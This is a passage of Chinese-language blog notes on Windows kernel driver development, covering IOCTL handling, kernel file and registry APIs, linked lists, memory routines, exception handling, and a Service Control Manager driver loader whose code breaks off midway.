<h2 id="直接读取设备"><a href="#直接读取设备" class="headerlink" title="直接读取设备"></a>直接读取设备</h2><p>原理也是比较简单的，就是找到用户给的缓冲区的真是物理地址，然后映射到内核模式下的内存里面，这样子内核模式操作的内存其实也就是缓冲区真是的内存，如果不这样直接操作缓冲去的话呢很有可能导致蓝屏。<br>我们直接读取设备得到的真是内存的方法是MsGetSystemAddressPorMdlSage这个函数，参数有两个，第一个是我们的pIrp的MdlAddress结构，这个结构主要记录了用户缓冲区的信息，第二个参数是内存也得信息，一般是：<code>NormalPagePriority</code>，同样的我们需要知道操作的大小，其实在MDLAddress结构体里面都有存储，但是DDK给了我们一个宏，方便操作，都是MmGetMdlXXX开头的，又回去长度，首地址，偏移量。其他的操作和缓冲区读写是一样的，这里不做记录了。</p>
<h2 id="其他IO操作"><a href="#其他IO操作" class="headerlink" title="其他IO操作"></a>其他IO操作</h2><p>其他的话呢就只有一个完全读写，就是那种不安全的，我们要放在try_except中，并且使用ProbeForWrite这类的函数去检查他的可读写程度。</p>
<h2 id="DeviceControl"><a href="#DeviceControl" class="headerlink" title="DeviceControl"></a>DeviceControl</h2><p>IRP是：IRP MJ_DEVICE_CONTROL<br>这个是其他操作方式，其实这里相对于读写操作来说的话呢就是多了一个IOCTL的判断，这个就是一个用CTL_CODE宏生成的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CTL_CODE：用于创建一个唯一的<span class="number">32</span>位系统I/O控制代码，这个控制代码包括<span class="number">4</span>部分组成：</span><br><span class="line"></span><br><span class="line">DeviceType（设备类型，高<span class="number">16</span>位（<span class="number">16</span><span class="number">-31</span>位）），</span><br><span class="line"></span><br><span class="line">Function（功能<span class="number">2</span><span class="number">-13</span> 位），</span><br><span class="line"></span><br><span class="line">Method（I/O访问内存使用方式）,</span><br><span class="line"></span><br><span class="line">Access（访问限制，<span class="number">14</span><span class="number">-15</span>位）。</span><br></pre></td></tr></table></figure>
<p>第一个是设备类型，第三个是操作模式（缓冲区，直接），第四个是访问权限。<br>第二个的话呢是一个0X800-0XFFF的数值，0-0X07FFF是系统的，我们只能定义0X800到0XFFF的。<br>与read和write区别的就是，我们通过stack-&gt;Parameters.DeviceControl.xxx获取相关的信息：</p>
<ol>
<li>IoControlCode是IOCTL码</li>
<li>OutBufferLegth是输出buffer的长度</li>
<li>同样的，操作的数据还是在pIrp-&gt;AssociatedIrp.SystemBuffer里面</li>
<li>直接读数据和缓冲区设备读取的却别就在于设置FLAG和DeviceType，并且是否要用MnGetSystemAddressForMdlSafe函数获得真正的物理地址映射的内核模式地址<br><img src="img3.jpg" alt="直接操作"></li>
</ol>
<p>看看这个就想起来了，缓冲区的话呢是不用使用内核地址的。</p>
<p>其他操作方式访问的话呢去直接和缓冲区的区别就在于要检查内存的可用性和获取输入输出地址的方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于 DeviceIOControl提供的输入缓冲区的地址，派遣函数可以通过LO堆栈(IO_</span><br><span class="line">STACK_LOCATION）的stack-&gt;Parameters.DeviceloControl.Type3InputBuffer得到。同时，</span><br><span class="line">DeviceIOControl提供的输出缓冲区的地址，派遣函数可以由IRP的pIrp-&gt;UserBuffer得到。</span><br></pre></td></tr></table></figure>

<p>一般我们是通过switch语句来判断IoControlCode码进行case操作。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动的文件操作</title>
    <url>/2020/09/21/%E9%A9%B1%E5%8A%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>相对于Windows用户模式下的文件操作，稍微复杂了一些，但也并不难。</p>
<h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p><code>ZwCreateFile</code>这个函数就在驱动层进行文件创建的一个函数，函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwCreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_     PHANDLE FileHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_     PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_  PLARGE_INTEGER AllocationSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG FileAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG ShareAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG CreateDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG CreateOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_  PVOID EaBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG EaLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这几个参数里面比较重要的就是第三个参数，这个参数其实是一个结构体，这个结构体里面是通过<code>InitializeObjectAttributes</code>这个函数生成的，这个函数比较关键的就是第二个参数，我们需要填写的是一个Unicode字符串，是我们生成文件的路径，这个路径需要注意的是，我们需要用符号连接名的方式进行存储，例如：<code>&quot;\\?\\C:\\1.log&quot;</code>，这里两个\是取消转义。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateFileTest</span><span class="params">(UNICODE_STRING * FileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	OBJECT_ATTRIBUTES objectAttributes;</span><br><span class="line">	IO_STATUS_BLOCK iostatus;</span><br><span class="line">	HANDLE hfile;</span><br><span class="line">	UNICODE_STRING logFileUniocdeString;</span><br><span class="line">	<span class="comment">//RtlInitUnicodeString(&amp;logFileUniocdeString, L"\\??\\C:\\1.log");</span></span><br><span class="line">	<span class="comment">//或者写成"\\Device\\HarddiskVolume1\\1.LOG"</span></span><br><span class="line">	logFileUniocdeString.Buffer = (PWSTR)ExAllocatePool(PagedPool, <span class="number">1024</span>);</span><br><span class="line">	logFileUniocdeString.MaximumLength = <span class="number">1024</span>;</span><br><span class="line">	WCHAR* wideString = <span class="string">L"\\??\\C:\\"</span>;</span><br><span class="line">	logFileUniocdeString.Length = wcslen(wideString) * <span class="number">2</span>;</span><br><span class="line">	RtlCopyMemory(logFileUniocdeString.Buffer, wideString, logFileUniocdeString.Length);</span><br><span class="line">	RtlAppendUnicodeStringToString(&amp;logFileUniocdeString, FileName);</span><br><span class="line">	<span class="comment">//初始化ObjectAttributes</span></span><br><span class="line">	InitializeObjectAttributes(&amp;objectAttributes, &amp;logFileUniocdeString, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//创建文件</span></span><br><span class="line">	NTSTATUS ntStatus = ZwCreateFile(&amp;hfile, GENERIC_WRITE, &amp;objectAttributes, &amp;iostatus, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Create File Successfully\n"</span>));</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Create File unsuccessfully\n"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*这里进行文件的操作*/</span></span><br><span class="line">	<span class="comment">//关闭文件句柄</span></span><br><span class="line">	ZwClose(hfile);</span><br><span class="line">	ExFreePool(logFileUniocdeString.Buffer);<span class="comment">//释放之前申请的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有一个iostatus，这个里面有个information，这个在后面是比较有用的。</p>
<h2 id="修改查询文件属性"><a href="#修改查询文件属性" class="headerlink" title="修改查询文件属性"></a>修改查询文件属性</h2><p>主要使用的是<code>zwSetInformationFile</code>和<code>zwQueryInformationFile</code>这两个函数的参数基本相同，唯一需要注意的是我第三个参数，查询是out的，设置是in的，这个查询和设置的参数是一个PVOID，这个是取决于我们使用的结构体，有文件信息，基本信息，文件名信息，文件指针信息，这些就不记录了，网上很多。</p>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>这个相对和用户模式下的没啥太大的区别，基本上操作类似可以说。<br>函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwWriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ HANDLE           Event,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ PVOID            ApcContext,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_    PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     PVOID            Buffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     ULONG            Length,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ PLARGE_INTEGER   ByteOffset,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ PULONG           Key</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是文件的句柄就是我们之前打开的，二三四参数一般为NULL，第五个参数就是iostatus，这个里面的information代表我们实际操作的自己数目，第六个参数是我们的缓冲区，第七个参数是我们写入数据的大小，第八个参数是我们开始的写入的偏移量，最后一个参数一般为NULL。<br>可以附加也可以覆盖。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateFileTest</span><span class="params">(UNICODE_STRING * FileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	OBJECT_ATTRIBUTES objectAttributes;</span><br><span class="line">	IO_STATUS_BLOCK iostatus;</span><br><span class="line">	HANDLE hfile;</span><br><span class="line">	UNICODE_STRING logFileUniocdeString;</span><br><span class="line">	<span class="comment">//RtlInitUnicodeString(&amp;logFileUniocdeString, L"\\??\\C:\\1.log");</span></span><br><span class="line">	<span class="comment">//或者写成"\\Device\\HarddiskVolume1\\1.LOG"</span></span><br><span class="line">	logFileUniocdeString.Buffer = (PWSTR)ExAllocatePool(PagedPool, <span class="number">1024</span>);</span><br><span class="line">	logFileUniocdeString.MaximumLength = <span class="number">1024</span>;</span><br><span class="line">	WCHAR* wideString = <span class="string">L"\\??\\C:\\"</span>;</span><br><span class="line">	logFileUniocdeString.Length = wcslen(wideString) * <span class="number">2</span>;</span><br><span class="line">	RtlCopyMemory(logFileUniocdeString.Buffer, wideString, logFileUniocdeString.Length);</span><br><span class="line">	RtlAppendUnicodeStringToString(&amp;logFileUniocdeString, FileName);</span><br><span class="line">	<span class="comment">//初始化ObjectAttributes</span></span><br><span class="line">	InitializeObjectAttributes(&amp;objectAttributes, &amp;logFileUniocdeString, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//创建文件</span></span><br><span class="line">	NTSTATUS ntStatus = ZwCreateFile(&amp;hfile, GENERIC_WRITE, &amp;objectAttributes, &amp;iostatus, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Create File Successfully\n"</span>));</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Create File unsuccessfully\n"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*这里进行文件的操作*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  BUFFER_SIZE 1024</span></span><br><span class="line">	PUCHAR	pBuffer = (PUCHAR)ExAllocatePool(PagedPool, BUFFER_SIZE);</span><br><span class="line">	RtlFillMemory(pBuffer, BUFFER_SIZE, <span class="number">0xAA</span>);</span><br><span class="line">	KdPrint((<span class="string">"将写入文件%d个字节\n"</span>, BUFFER_SIZE));</span><br><span class="line">	ZwWriteFile(hfile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;iostatus, pBuffer, BUFFER_SIZE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	KdPrint((<span class="string">"已经写入文件%d个字节\n"</span>, iostatus.Information));<span class="comment">//写文件</span></span><br><span class="line">	RtlFillMemory(pBuffer, BUFFER_SIZE, <span class="number">0xBB</span>);</span><br><span class="line">	KdPrint((<span class="string">"追加数据开始\n"</span>));</span><br><span class="line">	LARGE_INTEGER number;</span><br><span class="line">	number.QuadPart = <span class="number">1024</span>i64;<span class="comment">//设置文件指针,i64代表是这个类型</span></span><br><span class="line">	ZwWriteFile(hfile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;iostatus, pBuffer, BUFFER_SIZE, &amp;number, <span class="literal">NULL</span>);</span><br><span class="line">	KdPrint((<span class="string">"追加数据：%d\n"</span>, iostatus.Information));</span><br><span class="line">	<span class="comment">//关闭文件句柄</span></span><br><span class="line">	ZwClose(hfile);</span><br><span class="line">	ExFreePool(pBuffer);</span><br><span class="line">	ExFreePool(logFileUniocdeString.Buffer);<span class="comment">//释放之前申请的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意我们在CreateFile中使用的是FILE_OPEN_IF，可以覆盖也可以生成。<br>其他的话呢就是一个文件追加数据。<br>读取文件的话呢，需要注意的是我们需要知道文件的大小，这个文件大小是通过查询文件属性获得的，然后也是通过缓冲区进行查询，这里不记录了，也比较简单，也就是把写的一些参数改为了读。</p>
<h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>其实相对的注册表操作十分类似于文件的操作，就连参数中的传递过去的结构体也都是一样的。<br>打开注册表：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NTSTATUS </span><br><span class="line">  ZwCreateKey(</span><br><span class="line">    OUT PHANDLE  KeyHandle,</span><br><span class="line">    IN ACCESS_MASK  DesiredAccess, <span class="comment">//访问权限，一般为KEY_ALL_ACCLESS</span></span><br><span class="line">    IN POBJECT_ATTRIBUTES  ObjectAttributes,</span><br><span class="line">    IN ULONG  TitleIndex, <span class="comment">//一般为NULL</span></span><br><span class="line">    IN PUNICODE_STRING  Class  OPTIONAL, <span class="comment">//一般为NULL</span></span><br><span class="line">    IN ULONG  CreateOptions, <span class="comment">//一般为REG_OPTION_NON_VOLATILE</span></span><br><span class="line">    OUT PULONG  Disposition  OPTIONAL <span class="comment">//返回是打开成功还是创建成功</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>ObjectAttributes和之前的文件操作是一样的，Disposition这个代表是否是已经存在了的注册表项。</p>
<p>打开注册表的话呢，注意的就是打开的权限，一般要ALL。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NTSTATUS </span><br><span class="line">  ZwOpenKey(</span><br><span class="line">    OUT PHANDLE  KeyHandle,</span><br><span class="line">    IN ACCESS_MASK  DesiredAccess,</span><br><span class="line">    IN POBJECT_ATTRIBUTES  ObjectAttributes</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>设置注册表项：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NTSTATUS </span><br><span class="line">  ZwSetValueKey(</span><br><span class="line">    IN HANDLE  KeyHandle,</span><br><span class="line">    IN PUNICODE_STRING  ValueName, <span class="comment">//要新建或者修改的键名</span></span><br><span class="line">    IN ULONG  TitleIndex  OPTIONAL, <span class="comment">//一般设为0</span></span><br><span class="line">    IN ULONG  Type,  <span class="comment">//键值类型，上表中的一个</span></span><br><span class="line">    IN PVOID  Data, <span class="comment">//数据</span></span><br><span class="line">    IN ULONG  DataSize <span class="comment">//记录键值数据大小</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>需要注意的是，数据和数据大小是要根据键值类型进行决定的。</p>
<p>查询注册表项：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NTSTATUS </span><br><span class="line">  ZwQueryValueKey(</span><br><span class="line">    IN HANDLE  KeyHandle,</span><br><span class="line">    IN PUNICODE_STRING  ValueName, <span class="comment">//要查询的键名</span></span><br><span class="line">    IN KEY_VALUE_INFORMATION_CLASS  KeyValueInformationClass, <span class="comment">//查询的类别</span></span><br><span class="line">    OUT PVOID  KeyValueInformation, <span class="comment">//返回查询的信息的是</span></span><br><span class="line">    IN ULONG  Length, <span class="comment">//要查数据的长度</span></span><br><span class="line">    OUT PULONG  ResultLength <span class="comment">//实际查询数据的长度</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>这个函数要注意是我们一般需要用到两次，首先第一次我们不知道数据的长度，所以我们的Length参数只能传输为0，那个ResultLength就是我们的真是要查询的长度，并且我们还需要指定查询的信息类型，这个很像是查询文件的属性，这个值可以是KeyValueBasicInformation ，KeyValueFullInformation，KeyValuePartialInformation，我们就要为<code>KeyValueInformation</code>这个参数申请一块内存，是我们查询类型大小的内存块，然后第二次调用的时候我们就需要将查询数据的大小设置成刚才查询出来的大小了。</p>
<p>枚举子健和枚举子项很是相似：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NTSTATUS </span><br><span class="line">  ZwQueryKey(</span><br><span class="line">    IN HANDLE  KeyHandle,</span><br><span class="line">    IN KEY_INFORMATION_CLASS  KeyInformationClass,</span><br><span class="line">    OUT PVOID  KeyInformation,</span><br><span class="line">    IN ULONG  Length,</span><br><span class="line">    OUT PULONG  ResultLength</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">NTSTATUS </span><br><span class="line">  ZwEnumerateKey(</span><br><span class="line">    IN HANDLE  KeyHandle,</span><br><span class="line">    IN ULONG  Index,</span><br><span class="line">    IN KEY_INFORMATION_CLASS  KeyInformationClass,</span><br><span class="line">    OUT PVOID  KeyInformation,</span><br><span class="line">    IN ULONG  Length,</span><br><span class="line">    OUT PULONG  ResultLength</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>第一个函数得到的KeyInformation里有子项的个数，然后用第二个函数再获得子项的名称，这两个函数和查询注册表键值是类似的，都是要执行两次，枚举子键只是把<code>ZwEnumerateKey</code>换成了<code>ZwEnumerateValueKey</code>，这两个函数调用是类似的。</p>
<p>删除的话呢就只有一个参数，就是打开的句柄，但是需要注意的是，我们删除的话呢项目是不允许有子健的。</p>
<p>在DDK中为了简便操作，提供了Rtl开头的函数（感觉应该也是宏），操作起来比较简单，而且还有很多的功能。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动操作内存</title>
    <url>/2020/09/21/%E9%A9%B1%E5%8A%A8%E6%93%8D%E4%BD%9C%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<h2 id="链表的使用"><a href="#链表的使用" class="headerlink" title="链表的使用"></a>链表的使用</h2><p>DDK给我们自带了一个链表，比较好用。<br>这个链表有一个比较特殊的性质，就是他并没有数据字段，但是他又是如何设置的呢？其实这点比较聪明，我们创建一个含有这个链表的结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MyStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	LIST_ENTRY listEntry;</span><br><span class="line">&#125;*pMyStruct,MyStruct;</span><br></pre></td></tr></table></figure>
<p>这个链表只有一个是我们的数据，另一个是我们的链表，这个<code>LIST_ENTRY</code>就是DDK提供给我们的，显示初始话，然后就是申请我们结构体类型的内存块，然后给数据赋值，然后我们插入的时候我们是讲结构体的<code>LIST_ENTRY</code>字段插入进去，这样子我们<code>LIST_ENTRY</code>字段的内存地址就插件链表中了，当我们要使用的时候我们只需要计算一下我们结构体相对于这个<code>LIST_ENTRY</code>的偏移位置就可以了，这里的话呢DDK给了我们一个宏，<code>CONTAINING_RECORD</code>这个可以通过字段计算出来我们结构体的地址，然后我们就可以通过链表得到结构体的地址了。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkListTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LIST_ENTRY listHead;</span><br><span class="line">	InitializeListHead(&amp;listHead);</span><br><span class="line">	pMyStruct pData;</span><br><span class="line">	KdPrint((<span class="string">"开始插入数据\n"</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		pData = (pMyStruct)ExAllocatePool(PagedPool, <span class="keyword">sizeof</span>(MyStruct));</span><br><span class="line">		pData-&gt;number = i;</span><br><span class="line">		InsertHeadList(&amp;listHead, &amp;pData-&gt;listEntry);</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"开始删除链表\n"</span>));</span><br><span class="line">	<span class="keyword">while</span> (!IsListEmpty(&amp;listHead))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//从尾部删除一个元素</span></span><br><span class="line">		PLIST_ENTRY  pEntry = RemoveTailList(&amp;listHead);</span><br><span class="line">		pData = CONTAINING_RECORD(pEntry, MyStruct, listEntry);</span><br><span class="line">		KdPrint((<span class="string">"%d\n"</span>, pData-&gt;number));</span><br><span class="line">		ExFreePool(pData);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存的使用"><a href="#内存的使用" class="headerlink" title="内存的使用"></a>内存的使用</h2><p>这里的话呢大部分的函数都是Rt开头的，并且大部分都是宏，这些宏是讲我们的运行时函数规范了一下罢了，运行时函数是底层编译器提供的。<br>简单的示例操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span>  INITCODE</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PUCHAR pBuffer = (PUCHAR)ExAllocatePool(PagedPool, BUFFER_SIZE);</span><br><span class="line">	RtlZeroMemory(pBuffer, BUFFER_SIZE);</span><br><span class="line">	PUCHAR pBuffer2 = (PUCHAR)ExAllocatePool(PagedPool, BUFFER_SIZE);</span><br><span class="line">	RtlFillMemory(pBuffer2, BUFFER_SIZE, <span class="number">0xAA</span>);</span><br><span class="line">	RtlCopyMemory(pBuffer, pBuffer2, BUFFER_SIZE);</span><br><span class="line">	ULONG ulRet = RtlCompareMemory(pBuffer, pBuffer2, BUFFER_SIZE);</span><br><span class="line">	<span class="keyword">if</span> (ulRet == BUFFER_SIZE)</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Same"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>INITCODE</code>代表我们的这块用完就删除，不浪费空间的，一般来说<code>DriverEntry</code>就是这个样子的。<br>其他的代码都和之前的类似。</p>
<h2 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h2><p>使用try_except进行异常的捕获，可以有效的防止操作系统进入蓝屏。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">probeTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID badPointer = <span class="literal">NULL</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"进入try\n"</span>));</span><br><span class="line">		ProbeForWrite(badPointer, <span class="number">100</span>, <span class="number">4</span>);</span><br><span class="line">		KdPrint((<span class="string">"不会执行的语句"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	__except(EXCEPTION_EXECUTE_HANDLER)<span class="comment">//这个异常代表出错进来</span></span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"捕获到了异常\n"</span>));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"程序继续运行了\n"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码比较简单理解<code>ProbeForWrite</code>这个函数其实就是判断是不是可写的内存，但明显不可写。<code>EXCEPTION_EXECUTE_HANDLER</code>这个异常处理的方式是执行出错的话呢就跳到except中，这个也是最常用的。<br>其实也有事try-finally，这个比较特殊，就算你是在try中返回了，但是还是会执行finally中的代码的，这很有效的帮助我们执行销毁变量的操作（个人感觉比goto好用一些）</p>
<h2 id="多行宏注意事项"><a href="#多行宏注意事项" class="headerlink" title="多行宏注意事项"></a>多行宏注意事项</h2><p>在我们喜欢用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(xxx)</span><br><span class="line">	test();</span><br></pre></td></tr></table></figure>
<p>这个样子写的时候，如果我们test函数是一个宏，那么这样执行是不对的，多行宏我们是要加大括号的！</p>
<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>ASSERT是一个宏，来判断是否出错，如果出错则进入异常。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SYSManger</title>
    <url>/2020/09/21/SYSManger/</url>
    <content><![CDATA[<h1 id="驱动管理器"><a href="#驱动管理器" class="headerlink" title="驱动管理器"></a>驱动管理器</h1><p>相对于之前使用net于sc命令进行操作的命令行工具，完全可以自己进行编写一个小软件进行自动化的测试。</p>
<h2 id="加载函数"><a href="#加载函数" class="headerlink" title="加载函数"></a>加载函数</h2><p>首先我们需要编写加载驱动以及卸载驱动的函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 用来加载驱动程序												         */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadNTDriver</span><span class="params">(<span class="keyword">char</span>* lpszDreverName,<span class="keyword">char</span> * lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szDriverImagePath[<span class="number">256</span>];</span><br><span class="line">	GetFullPathName(lpszDriverPath,<span class="number">256</span>,szDriverImagePath,<span class="literal">NULL</span>);</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//scm管理器的句柄</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动的服务句柄</span></span><br><span class="line">	hServiceMgr = OpenSCManager(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManger() Faild %d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManger() OK\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	hServiceDDK = CreateService(hServiceMgr,lpszDreverName,lpszDreverName,SC_MANAGER_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START</span><br><span class="line">		,SERVICE_ERROR_IGNORE,szDriverImagePath,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD dwRtn;</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dwRtn = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwRtn != ERROR_IO_PENDING &amp;&amp; dwRtn != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span 